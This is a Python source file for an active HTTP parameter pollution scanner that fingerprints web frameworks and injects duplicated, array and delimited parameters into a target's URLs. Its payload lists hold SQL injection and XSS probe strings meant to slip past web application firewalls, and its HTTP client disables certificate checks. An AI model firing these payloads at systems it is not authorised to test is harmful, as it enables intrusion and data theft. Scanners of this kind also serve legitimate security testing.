"""
HTTP Parameter Pollution Scanner
=================================
Detects HPP vulnerabilities that bypass WAF and enable injection attacks.

Innovation:
1. **Duplicate Parameter Testing** - Tests how backend handles ?id=1&id=2
2. **WAF Bypass Detection** - HPP to circumvent SQLi/XSS filters
3. **Framework Fingerprinting** - PHP, Node.js, ASP.NET, Java parameter precedence
4. **Array Pollution** - Tests ?param[]=1&param[]=2 injection
5. **Delimiter Testing** - Tests comma, semicolon, pipe delimiters in single param
6. **Priority Confusion** - Tests first-wins vs last-wins vs array concat

No other tool tests WAF bypass + framework-specific HPP behavior.
"""
from __future__ import annotations

import asyncio
import hashlib
import logging
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import quote, urlencode

import httpx

log = logging.getLogger("oneinfinity.hpp_scanner")

# ─────────────────────────────────────────────────────────────────────────────
# HPP Test Payloads
# ─────────────────────────────────────────────────────────────────────────────

_HPP_SQLI_PAYLOADS = [
    # Duplicate param SQLi bypass
    ("?id=1&id=1' OR '1'='1", "sql_injection"),
    ("?id=1&id=1%27%20OR%20%271%27=%271", "sql_injection"),
    ("?email=test@test.com&email=admin'--", "sql_injection"),
]

_HPP_XSS_PAYLOADS = [
    # Duplicate param XSS bypass
    ("?name=John&name=<script>alert(1)</script>", "xss"),
    ("?search=test&search=<img src=x onerror=alert(1)>", "xss"),
]

_HPP_ARRAY_PAYLOADS = [
    # Array parameter pollution
    ("?param[]=1&param[]=<script>alert(1)</script>", "array_pollution_xss"),
    ("?id[]=1&id[]=1' OR '1'='1", "array_pollution_sqli"),
    ("?filter[name]=admin&filter[role]=admin", "array_pollution_idor"),
]

_HPP_DELIMITER_PAYLOADS = [
    # Delimiter-based pollution
    ("?id=1,2,3,4' OR '1'='1", "delimiter_sqli_comma"),
    ("?tags=test;admin;user;<script>alert(1)</script>", "delimiter_xss_semicolon"),
    ("?roles=user|admin|root", "delimiter_privilege_escalation"),
]

# Framework-specific parameter precedence
_FRAMEWORK_TESTS = {
    "php": {
        "test": "?param=first&param=last",
        "expected_behavior": "last",  # PHP takes last value
        "indicator": "PHP/",
    },
    "aspnet": {
        "test": "?param=first&param=last",
        "expected_behavior": "first,last",  # ASP.NET concatenates with comma
        "indicator": "ASP.NET",
    },
    "nodejs": {
        "test": "?param=first&param=last",
        "expected_behavior": "array",  # Node.js creates array
        "indicator": "Express",
    },
    "java": {
        "test": "?param=first&param=last",
        "expected_behavior": "first",  # Java servlets take first value
        "indicator": "Java",
    },
}

# ─────────────────────────────────────────────────────────────────────────────
# Data Models
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class HPPFinding:
    """HPP vulnerability finding."""
    finding_id: str
    vuln_type: str = "hpp"
    title: str = ""
    severity: str = "high"
    url: str = ""
    parameter: str = ""
    hpp_type: str = ""  # duplicate_param, array_pollution, delimiter, waf_bypass
    framework: str = ""
    payload: str = ""
    evidence: str = ""
    confidence: float = 0.0
    waf_bypassed: bool = False
    exploitation_steps: List[str] = field(default_factory=list)
    tool: str = "hpp_scanner"
    source_type: str = "active"

    def to_dict(self) -> dict:
        return {
            "finding_id": self.finding_id,
            "vuln_type": self.vuln_type,
            "title": self.title,
            "severity": self.severity,
            "url": self.url,
            "parameter": self.parameter,
            "hpp_type": self.hpp_type,
            "framework": self.framework,
            "payload": self.payload,
            "evidence": self.evidence,
            "confidence": self.confidence,
            "waf_bypassed": self.waf_bypassed,
            "exploitation_steps": self.exploitation_steps,
            "tool": self.tool,
            "source_type": self.source_type,
        }


# ─────────────────────────────────────────────────────────────────────────────
# HPP Scanner
# ─────────────────────────────────────────────────────────────────────────────

class HPPScanner:
    """
    HTTP Parameter Pollution scanner.

    Workflow:
    1. Discover parameters from traffic
    2. Fingerprint backend framework
    3. Test duplicate parameter handling
    4. Test array parameter pollution
    5. Test delimiter-based pollution
    6. Test WAF bypass via HPP
    """

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.http_client = httpx.AsyncClient(
            timeout=timeout,
            verify=False,
            follow_redirects=True,
        )
        self.tested_params: Set[str] = set()
        self.framework_cache: Dict[str, str] = {}

    async def close(self):
        """Close HTTP client."""
        await self.http_client.aclose()

    # ── Parameter Discovery ───────────────────────────────────────────────────

    async def discover_parameters(
        self,
        target: str,
        limit: int = 500
    ) -> List[Dict[str, Any]]:
        """Extract parameters from captured traffic."""
        parameters = []

        try:
            from oneinfinity.scan.traffic_capture_engine import traffic_capture_engine
        except ImportError:
            log.warning("Traffic capture engine not available")
            return []

        try:
            requests = traffic_capture_engine.list(target=target, limit=limit)
        except Exception as e:
            log.error(f"Failed to fetch traffic: {e}")
            return []

        for req in requests:
            req_dict = req.to_json() if hasattr(req, 'to_json') else req

            url = req_dict.get("url", "")
            method = req_dict.get("method", "GET")

            # Extract GET parameters
            params = {}
            if method == "GET" and "?" in url:
                query = url.split("?", 1)[1].split("#")[0]
                for part in query.split("&"):
                    if "=" in part:
                        k, v = part.split("=", 1)
                        params[k] = v

            # Extract POST parameters
            body = req_dict.get("body", "")
            if body and method in ("POST", "PUT"):
                for part in body.split("&"):
                    if "=" in part:
                        k, v = part.split("=", 1)
                        params[k] = v

            for param_name, param_value in params.items():
                parameters.append({
                    "url": url.split("?")[0] if method == "GET" else url,
                    "method": method,
                    "parameter": param_name,
                    "value": param_value
                })

        log.info(f"Discovered {len(parameters)} parameters")
        return parameters

    # ── Framework Fingerprinting ──────────────────────────────────────────────

    async def fingerprint_framework(self, url: str) -> str:
        """Detect backend framework from headers/behavior."""
        if url in self.framework_cache:
            return self.framework_cache[url]

        framework = "unknown"

        try:
            resp = await self.http_client.get(url)
            headers = resp.headers

            # Check headers
            if "X-Powered-By" in headers:
                powered_by = headers["X-Powered-By"].lower()
                if "php" in powered_by:
                    framework = "php"
                elif "asp.net" in powered_by:
                    framework = "aspnet"
                elif "express" in powered_by:
                    framework = "nodejs"

            # Check server header
            server = headers.get("Server", "").lower()
            if "apache" in server or "php" in server:
                framework = "php"
            elif "nginx" in server and "node" in resp.text.lower():
                framework = "nodejs"
            elif "microsoft-iis" in server:
                framework = "aspnet"

        except Exception as e:
            log.debug(f"Framework fingerprinting failed: {e}")

        self.framework_cache[url] = framework
        log.debug(f"Fingerprinted {url} as {framework}")
        return framework

    # ── Testing Methods ───────────────────────────────────────────────────────

    async def test_duplicate_param(
        self,
        url: str,
        method: str,
        param_name: str,
        param_value: str
    ) -> Optional[HPPFinding]:
        """Test duplicate parameter handling."""
        framework = await self.fingerprint_framework(url)

        # Test with benign duplicate
        try:
            base_url = url.split("?")[0]
            test_url = f"{base_url}?{param_name}=first&{param_name}=second"

            if method == "GET":
                resp = await self.http_client.get(test_url)
            else:
                resp = await self.http_client.post(
                    url,
                    data=f"{param_name}=first&{param_name}=second",
                    headers={"Content-Type": "application/x-www-form-urlencoded"}
                )

            # Check if parameter appears multiple times in response
            if "first" in resp.text and "second" in resp.text:
                return HPPFinding(
                    finding_id=hashlib.md5(f"hpp_dup_{url}_{param_name}".encode()).hexdigest()[:16],
                    title=f"HPP duplicate parameter on {param_name}",
                    severity="medium",
                    url=url,
                    parameter=param_name,
                    hpp_type="duplicate_param",
                    framework=framework,
                    payload=test_url,
                    evidence=f"Both 'first' and 'second' values processed. Framework: {framework}",
                    confidence=0.80,
                    exploitation_steps=[
                        f"1. Parameter {param_name} accepts duplicate values",
                        f"2. Framework: {framework} (may process both values)",
                        "3. Can bypass WAF by splitting malicious payload",
                        "4. Example: ?param=safe&param=<script>alert(1)</script>",
                    ]
                )

        except Exception as e:
            log.debug(f"Duplicate param test failed: {e}")

        return None

    async def test_waf_bypass(
        self,
        url: str,
        method: str,
        param_name: str
    ) -> Optional[HPPFinding]:
        """Test HPP-based WAF bypass."""
        # Test SQLi WAF bypass
        for payload, attack_type in _HPP_SQLI_PAYLOADS:
            try:
                if "?" in payload:
                    # Replace param name
                    test_payload = payload.replace("?id=", f"?{param_name}=").replace("&id=", f"&{param_name}=")
                    test_url = url.split("?")[0] + test_payload

                    resp = await self.http_client.get(test_url)

                    # Check for SQL error or bypass indicators
                    sql_errors = ["sql", "mysql", "syntax", "database", "query"]
                    for error in sql_errors:
                        if error in resp.text.lower():
                            return HPPFinding(
                                finding_id=hashlib.md5(f"hpp_waf_sqli_{url}_{param_name}".encode()).hexdigest()[:16],
                                title=f"HPP WAF bypass (SQLi) on {param_name}",
                                severity="critical",
                                url=url,
                                parameter=param_name,
                                hpp_type="waf_bypass",
                                framework=await self.fingerprint_framework(url),
                                payload=test_url,
                                evidence=f"SQL error detected via HPP bypass: {resp.text[:200]}",
                                confidence=0.90,
                                waf_bypassed=True,
                                exploitation_steps=[
                                    "1. HPP bypasses WAF SQL injection filter",
                                    f"2. Duplicate {param_name} parameters confuse WAF",
                                    "3. Backend concatenates/processes both values",
                                    "4. SQLi payload reaches database without filtering",
                                ]
                            )

            except Exception as e:
                log.debug(f"WAF bypass test failed: {e}")
                continue

        # Test XSS WAF bypass
        for payload, attack_type in _HPP_XSS_PAYLOADS:
            try:
                if "?" in payload:
                    test_payload = payload.replace("?name=", f"?{param_name}=").replace("&name=", f"&{param_name}=").replace("?search=", f"?{param_name}=").replace("&search=", f"&{param_name}=")
                    test_url = url.split("?")[0] + test_payload

                    resp = await self.http_client.get(test_url)

                    # Check for XSS reflection
                    xss_indicators = ["<script>", "onerror=", "alert(1)"]
                    for indicator in xss_indicators:
                        if indicator in resp.text:
                            return HPPFinding(
                                finding_id=hashlib.md5(f"hpp_waf_xss_{url}_{param_name}".encode()).hexdigest()[:16],
                                title=f"HPP WAF bypass (XSS) on {param_name}",
                                severity="high",
                                url=url,
                                parameter=param_name,
                                hpp_type="waf_bypass",
                                framework=await self.fingerprint_framework(url),
                                payload=test_url,
                                evidence=f"XSS payload reflected via HPP bypass: {resp.text[:200]}",
                                confidence=0.90,
                                waf_bypassed=True,
                                exploitation_steps=[
                                    "1. HPP bypasses WAF XSS filter",
                                    f"2. Duplicate {param_name} parameters split payload",
                                    "3. Backend merges values without sanitization",
                                    "4. XSS executes in victim browser",
                                ]
                            )

            except Exception as e:
                log.debug(f"XSS WAF bypass test failed: {e}")
                continue

        return None

    async def test_array_pollution(
        self,
        url: str,
        method: str,
        param_name: str
    ) -> Optional[HPPFinding]:
        """Test array parameter pollution."""
        for payload, attack_type in _HPP_ARRAY_PAYLOADS:
            try:
                # Replace param name
                test_payload = payload.replace("param", param_name).replace("id", param_name).replace("filter", param_name)
                test_url = url.split("?")[0] + test_payload

                resp = await self.http_client.get(test_url)

                # Check for array pollution indicators
                if "[]" in test_payload and ("script" in resp.text.lower() or "sql" in resp.text.lower()):
                    return HPPFinding(
                        finding_id=hashlib.md5(f"hpp_array_{url}_{param_name}".encode()).hexdigest()[:16],
                        title=f"HPP array pollution on {param_name}",
                        severity="high",
                        url=url,
                        parameter=param_name,
                        hpp_type="array_pollution",
                        framework=await self.fingerprint_framework(url),
                        payload=test_url,
                        evidence=f"Array parameter pollution detected: {attack_type}",
                        confidence=0.85,
                        exploitation_steps=[
                            f"1. Array parameter {param_name}[] accepts multiple values",
                            "2. Backend processes array without validation",
                            f"3. {attack_type.replace('_', ' ').title()} via array injection",
                            "4. Can bypass filters expecting single string",
                        ]
                    )

            except Exception as e:
                log.debug(f"Array pollution test failed: {e}")
                continue

        return None

    # ── Orchestration ─────────────────────────────────────────────────────────

    async def scan_parameter(
        self,
        url: str,
        method: str,
        param_name: str,
        param_value: str
    ) -> List[HPPFinding]:
        """Scan single parameter for HPP."""
        param_key = f"{method}:{url}:{param_name}"
        if param_key in self.tested_params:
            return []
        self.tested_params.add(param_key)

        # Run tests
        tests = [
            self.test_duplicate_param(url, method, param_name, param_value),
            self.test_waf_bypass(url, method, param_name),
            self.test_array_pollution(url, method, param_name),
        ]

        results = await asyncio.gather(*tests, return_exceptions=True)

        findings = []
        for result in results:
            if isinstance(result, HPPFinding):
                findings.append(result)
            elif isinstance(result, Exception):
                log.debug(f"HPP test failed: {result}")

        return findings

    async def scan(
        self,
        target: str,
        traffic_limit: int = 500
    ) -> List[HPPFinding]:
        """
        Scan target for HPP vulnerabilities.

        Args:
            target: Target domain/URL
            traffic_limit: Max traffic records

        Returns:
            List of HPP findings
        """
        log.info(f"Starting HPP scan for {target}")

        # Discover parameters
        parameters = await self.discover_parameters(target, traffic_limit)

        if not parameters:
            log.info("No parameters found")
            return []

        log.info(f"Testing {len(parameters)} parameters")

        # Scan all parameters
        all_findings = []
        for param in parameters[:30]:  # Test first 30
            findings = await self.scan_parameter(
                param["url"],
                param["method"],
                param["parameter"],
                param["value"]
            )
            all_findings.extend(findings)

        log.info(f"HPP scan complete: {len(all_findings)} findings")
        return all_findings


# ─────────────────────────────────────────────────────────────────────────────
# Convenience Function
# ─────────────────────────────────────────────────────────────────────────────

async def scan_hpp(
    target: str,
    traffic_limit: int = 500
) -> List[HPPFinding]:
    """Scan HPP vulnerabilities."""
    scanner = HPPScanner()
    try:
        return await scanner.scan(target, traffic_limit)
    finally:
        await scanner.close()
